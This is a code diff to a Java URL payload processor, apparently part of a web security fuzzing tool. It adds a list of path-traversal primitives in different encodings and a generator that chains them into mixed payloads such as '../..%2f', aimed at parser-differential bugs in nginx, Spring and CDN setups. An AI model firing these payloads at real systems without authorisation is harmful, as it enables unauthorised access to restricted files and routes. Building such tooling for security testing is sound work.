@@ -52,6 +52,19 @@ public class UrlPayloadProcessor {
             }
         }
 
+        // Auto-generated cross-encoding traversal chains: mix different encoding styles
+        // in one payload (e.g. ../..%2f) to hit parser-diff bugs where layer 1 decodes
+        // %2f but layer 2 doesn't (nginx alias, Spring routing, CDN-vs-origin desyncs).
+        Set<InjectionClass> chainClasses = EnumSet.of(InjectionClass.PREFIX, InjectionClass.BETWEEN);
+        for (String chain : generateCrossEncodingChains()) {
+            for (String variant : expandCaseVariants(chain)) {
+                String key = chainClasses + "|" + variant;
+                if (seen.add(key)) {
+                    classified.add(new Classified(chainClasses, variant));
+                }
+            }
+        }
+
         for (Classified cp : classified) {
             String payload = cp.payload;
 
@@ -110,6 +123,25 @@ public class UrlPayloadProcessor {
     // place; BETWEEN inserts the payload as its own segment between existing ones
     // (e.g. /api/..;/v1/users — not reachable via the other three).
     enum InjectionClass { PREFIX, SUFFIX, SANDWICH, BETWEEN }
+
+    // Traversal primitives with different encoding styles. Cross-chaining two unlike
+    // primitives in one payload produces parser-diff bugs against stacks that decode
+    // encodings inconsistently across layers.
+    private static final String[] TRAVERSAL_PRIMITIVES = {
+            "../", "..%2f", "..;/", "%2e%2e/", "%2e%2e%2f"
+    };
+
+    static List<String> generateCrossEncodingChains() {
+        List<String> out = new ArrayList<>();
+        for (String a : TRAVERSAL_PRIMITIVES) {
+            for (String b : TRAVERSAL_PRIMITIVES) {
+                if (!a.equals(b)) {
+                    out.add(a + b);
+                }
+            }
+        }
+        return out;
+    }
 
     private static final Set<InjectionClass> DEFAULT_CLASSES =
             Collections.unmodifiableSet(EnumSet.of(
